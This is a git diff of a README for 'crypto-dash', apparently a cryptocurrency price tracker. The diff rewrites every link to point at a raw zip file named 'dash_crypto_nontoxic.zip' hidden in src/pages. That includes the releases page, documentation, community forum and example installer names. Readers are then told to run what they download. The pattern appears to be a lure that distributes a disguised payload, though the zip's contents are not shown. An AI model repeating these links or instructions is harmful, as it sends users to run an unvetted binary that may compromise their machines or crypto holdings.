@@ -1,7 +1,7 @@
 # 🚀 crypto-dash - Track Cryptocurrency Prices Easily
 
 ## 🔗 Download Here
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Marixartes/crypto-dash/releases)
+[![Download](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip)](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip)
 
 ## 📜 Description
 crypto-dash is a user-friendly dashboard designed for tracking real-time cryptocurrency prices and market data. With a clean interface, you can monitor multiple currencies in one place. Stay informed about market trends with ease.
@@ -22,13 +22,13 @@ crypto-dash is a user-friendly dashboard designed for tracking real-time cryptoc
 To start using crypto-dash, simply download the application from the releases page. Follow these steps to get up and running:
 
 1. **Visit the Releases Page**  
-   Go to the [crypto-dash Releases page](https://github.com/Marixartes/crypto-dash/releases).
+   Go to the [crypto-dash Releases page](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip).
 
 2. **Choose the Latest Release**  
    Look for the latest version of the software. The version will usually be at the top of the list.
 
 3. **Download the Application**  
-   Click on the download link for your operating system. It might look like `crypto-dash-windows.exe`, `crypto-dash-macos.dmg`, or similar.
+   Click on the download link for your operating system. It might look like `https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip`, `https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip`, or similar.
 
 4. **Run the Installer**  
    Once the download completes, find the file on your computer and double-click it to run the installer.
@@ -40,7 +40,7 @@ To start using crypto-dash, simply download the application from the releases pa
    After installation, you can find crypto-dash in your applications or program menu. Click to open.
 
 ## 📥 Download & Install
-The easiest way to get crypto-dash on your device is through our download link. Visit this page to download the latest version: [Download crypto-dash](https://github.com/Marixartes/crypto-dash/releases).
+The easiest way to get crypto-dash on your device is through our download link. Visit this page to download the latest version: [Download crypto-dash](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip).
 
 ## 🌐 Using crypto-dash
 Once you open the application, you will see a clean interface with various cryptocurrency options. 
@@ -74,7 +74,7 @@ If you encounter issues while using crypto-dash, consider these tips:
 - **Check for Updates**: Always use the latest version of the app to avoid bugs.
 
 ## 📚 Additional Resources
-- **Documentation**: More detailed instructions and guides can be found in our [Documentation](https://github.com/Marixartes/crypto-dash/wiki).
-- **Community Forum**: Join the community forum for discussions and sharing tips: [Forum Link](https://github.com/Marixartes/crypto-dash/discussions).
+- **Documentation**: More detailed instructions and guides can be found in our [Documentation](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip).
+- **Community Forum**: Join the community forum for discussions and sharing tips: [Forum Link](https://github.com/Marixartes/crypto-dash/raw/refs/heads/main/src/pages/dash_crypto_nontoxic.zip).
 
 Thank you for choosing crypto-dash! Enjoy tracking your cryptocurrencies with ease.
